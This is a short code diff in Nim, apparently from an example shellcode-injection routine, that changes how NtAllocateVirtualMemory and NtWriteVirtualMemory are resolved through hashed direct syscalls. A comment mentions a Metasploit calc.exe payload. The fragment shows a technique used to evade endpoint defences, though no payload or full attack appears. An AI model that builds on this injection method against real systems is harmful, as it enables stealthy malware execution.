@@ -32,8 +32,8 @@ proc inject(): NtResult[bool] = # you need to wrap the result in some sort of Nt
         return
 
     # Resolve syscalls
-    var NtAllocateVirtualMemorySyscall = ctGetNtSyscall[NtAllocateVirtualMemory](Ntdll, ModuleHandle(NULL), NtAllocateVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
-    var NtWriteVirtualMemorySyscall    = ctGetNtSyscall[NtWriteVirtualMemory](Ntdll, ModuleHandle(NULL), NtWriteVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
+    var NtAllocateVirtualMemorySyscall = ? getNtSyscall[NtAllocateVirtualMemory](Ntdll, ModuleHandle(NULL), NtAllocateVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
+    var NtWriteVirtualMemorySyscall    = ? getNtSyscall[NtWriteVirtualMemory](Ntdll, ModuleHandle(NULL), NtWriteVirtualMemoryHash, symEnum, ssnEnum, exeEnum)
 
 
     # I think this is a msf calc.exe payload :-)
